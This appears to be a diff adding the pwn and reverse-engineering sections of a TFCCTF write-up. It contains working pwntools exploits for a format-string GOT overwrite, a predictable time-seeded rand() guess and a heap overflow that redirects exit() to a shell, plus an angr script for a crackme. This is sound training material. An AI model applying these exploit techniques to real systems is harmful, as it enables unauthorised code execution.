@@ -344,3 +344,379 @@ The flag is then shown on the page:
 TFCCTF{I_l1k3_dr4g0n_tr33s__Yuh!_1ts_my_f4v0r1t3_tr33_f0r_sur3!}
 ```
 
+# Pwn
+
+## Shello World
+
+For this challenge we are just given a 64 bit elf file.
+
+It's a fairly small binary with only 3 functions. Main, Vuln and win. The win function just runs "bin/sh" so this will be our target.
+
+The vuln function has the following code:
+
+```c
+  fgets((char *)&local_108,0x100,stdin);
+  printf("Hello, ");
+  printf((char *)&local_108);
+  putchar(10);
+  return;
+```
+
+So right away we can see a printf / format strings vulnerability. We can confirm this by running the program and sending %p.
+
+```
+❯ ./shello-world
+%p
+Hello, 0x7fff65541f00
+```
+
+We don't have any overflow and checking the securities with checksec we can see that "RELRO" is only set to Partial. This means we can overwrite parts of the GOT.
+
+```
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+```
+
+So our attack will be a basic format strings GOT overwrite. pwntools makes this very easy. I choose exit as my GOT entry to overwrite.
+
+Running the script the remote server we can cat the flag:
+```
+TFCCTF{ab45ed10bb240fe11c5552d3db6776f708c650253755e706268b45f3aae6d925}
+```
+
+Full script:
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+
+exe = './shello-world'
+
+elf = context.binary = ELF(exe)
+context.terminal = ['alacritty', '-e', 'zsh', '-c']
+
+#context.log_level= 'DEBUG'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+gdbscript = '''
+
+'''.format(**locals())
+
+
+def send_payload(payload):
+    io.sendline(payload)
+    return io.recvline()
+
+
+#### Exploit starts here ####
+
+io = start()
+
+payload =  fmtstr_payload(6, {
+    elf.got.exit : elf.sym.win
+    }, write_size='short')
+
+io.sendline(payload)
+io.interactive()
+```
+
+## Random
+This challenge is a random number "guesser" style challenge. This is something I have seen a fair bit lately and even made a challenge around the idea myself in the past. So right away I knew I could use the CDLL library from python.
+
+```c
+  setup();
+  tVar2 = time((time_t *)0x0);
+  srand((uint)tVar2);
+  for (local_14 = 0; local_14 < 10; local_14 = local_14 + 1) {
+    iVar1 = rand();
+    *(int *)(v + (long)local_14 * 4) = iVar1;
+  }
+  puts("Guess my numbers!");
+  for (local_10 = 0; local_10 < 10; local_10 = local_10 + 1) {
+    __isoc99_scanf(&DAT_0010201e,input + (long)local_10 * 4);
+  }
+  local_c = 0;
+  while( true ) {
+    if (9 < local_c) {
+      win();
+      return 0;
+    }
+    if (*(int *)(v + (long)local_c * 4) != *(int *)(input + (long)local_c * 4)) break;
+    local_c = local_c + 1;
+  }
+  puts("You didn\'t make it :(");
+                    /* WARNING: Subroutine does not return */
+  exit(0);
+}
+```
+
+This output from ghidra gives us enough detail to solve this.
+
+The program prints `guess my numbers!`  and we have to try guess the correct number 10 times in a row. if we do that the program runs the `win()` function which just runs `/bin/sh` for us.
+
+From the 2nd and 3rd line you can see the seed for rand is using the current time. This `time` is just unix time we dont need to worry about time zones or anything like that. 
+
+solve script:
+```python
+#!/usr/bin/env python3
+from pwn import *
+from ctypes import CDLL
+import time
+
+exe = './random'
+
+elf = ELF(exe)
+context.binary = elf
+context.terminal = ['alacritty', '-e', 'zsh', '-c']
+
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+gdbscript = '''
+
+'''.format(**locals())
+
+#### Exploit starts here ####
+
+io = start()
+
+libc = CDLL('libc.so.6')
+
+current_time = libc.time(None)
+current_time = current_time + 0 
+libc.srand(current_time)
+
+io.recvuntil(b'numbers!')
+
+for i in range(10):
+    guess = libc.rand() 
+    io.sendline(str(guess).encode())
+
+io.interactive()
+```
+
+flag:
+```
+TFCCTF{W0W!_Y0U_GU3SS3D_TH3M_4LL!@!}
+```
+
+sometimes on remote you might need to + a few seconds here: `current_time = current_time + 0 `
+
+
+## Notes
+
+This is a standard heap note style challenge. we are given the source code for this which was nice :) 
+```c
+#include <stdio.h>
+#include <stdlib.h>
+
+#define CONTENT_MAX (long long)256
+#define NOTES_MAX 10
+
+typedef struct _note_t {
+    char* content;
+} note_t;
+
+void win() {
+    system("/bin/sh");
+}
+
+void menu() {
+    printf(
+        "1. Add note\n"
+        "2. Edit note\n"
+        "3. View notes\n"
+        "0. Exit\n"
+    );
+}
+
+int get_index() {
+    printf("index> \n");
+    int index;
+    scanf("%d", &index);
+    getchar();
+    if (index < 0 || index > NOTES_MAX) {
+        return -1;
+    }
+    return index;
+}
+
+note_t* add() {
+    note_t* note = malloc(sizeof(note_t));
+    note->content = malloc(sizeof(CONTENT_MAX));
+    printf("content> \n");
+    fgets(note->content, sizeof(CONTENT_MAX), stdin);
+    return note;
+}
+
+void edit(note_t* note) {
+    printf("content> \n");
+    fgets(note->content, CONTENT_MAX, stdin);
+}
+
+void view(note_t* notes[]) {
+    for (int i = 0; i < NOTES_MAX; i += 1) {
+        printf("%d. ", i);
+        if (notes[i] == NULL) {
+            printf("<empty>\n");
+        } else {
+            printf("%s\n", notes[i]->content);
+        }
+    }
+}
+
+int main() {
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+
+    note_t* notes[10] = { 0 };
+
+    while (1) {
+        menu();
+        int input;
+        scanf("%d", &input);
+        switch (input) {
+            case 1: {
+                int index = get_index();
+                if (index == -1) {
+                    break;
+                }
+                notes[index] = add();
+                break;
+            }
+            case 2: {
+                int index = get_index();
+                if (index == -1) {
+                    break;
+                }
+                if (notes[index] == NULL) {
+                    break;
+                }
+                edit(notes[index]);
+                break;
+            }
+            case 3:
+                view(notes);
+                break;
+            case 0:
+                exit(0);
+                break;
+            default:
+                break;
+        }
+    }
+}
+```
+
+We have a win function which will be our target. 
+This challenge has a heap overflow. the add function and the edit function both have different values for the size of the data we enter. as a result we can overflow from one chunk into the next. 
+
+My idea for this exploit was GOT overwrite as it seemed the best option. If we can overwrite exit with win, the next time we call exit (sending 0 as input) win will be called and we should get a shell.
+
+As someone new to heap this challenge took a fair bit of debugging and messing around with GDB. eventually I got a working exploit.  
+
+We first need to create new notes. the content of these does not matter.  
+Than we edit the first note. and overflow into the 2nd not with our pointer to `got exit` once we overflow into chunk2 we can edit chunk 2 with the address of win and this will overwrite `got exit` with `win`
+
+solve script:
+```python
+#!/usr/bin/env python3
+from pwn import *
+
+
+exe = './notes'
+
+elf = context.binary = ELF(exe)
+context.terminal = ['alacritty', '-e', 'zsh', '-c']
+
+#context.log_level= 'DEBUG'
+
+def start(argv=[], *a, **kw):
+    if args.GDB:  # Set GDBscript below
+        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+    elif args.REMOTE:  # ('server', 'port')
+        return remote(sys.argv[1], sys.argv[2], *a, **kw)
+    else:  # Run locally
+        return process([exe] + argv, *a, **kw)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+def add_note(index, content):
+    io.sendline(b'1')
+    io.sendline(str(index))
+    io.sendline(content)
+
+
+def edit_note(index, content):
+    io.sendline(b'2')
+    io.sendline(str(index))
+    io.sendline(content)
+
+#### Exploit starts here ####
+
+io = start()
+
+win = elf.symbols.win
+exit_got = elf.got.exit
+
+add_note(1,b'A')
+
+add_note(2,b'B')
+
+edit_note(1,b'A'*32+p64(exit_got))
+edit_note(2,p64(win))
+
+io.sendline(b'0') # exit
+io.interactive()
+```
+
+flag;
+`TFCCTF{103a360f285151bfda3fb4009852c15084fd9bf997470c43c20eef413ed98898}`
+
+# Rev
+
+## Pass
+
+This is a crackme style program. While I could have actually tried to reverse the binary that goes against everything I believe in. So I looked at the main function and saw the two strings I would need.
+
+"Wrong password" and "Correct password"
+
+The address of Wrong was @ `0x00101984`
+The address of Correct was @ `0x001019b3`
+
+I used angr to solve this challenge. after about 5-10 seconds I get the flag:
+![angr program goes grrr]({{ site.baseurl }}/images/thefewchosen/angr.png)
+```python
+import angr
+
+# start at 0x400000 because cus PIE is enabled
+win_adress = 0x19b3 + 0x400000
+fail_adress = 0x1984 + 0x400000
+
+p = angr.Project('./pass')
+simgr = p.factory.simulation_manager(p.factory.full_init_state())
+simgr.explore(find=win_adress, avoid=fail_adress)
+print(simgr.found[0].posix.dumps(0))
+```
+
+flag:
+`TFCCTF{f0und_th3_p44sv0rd}`
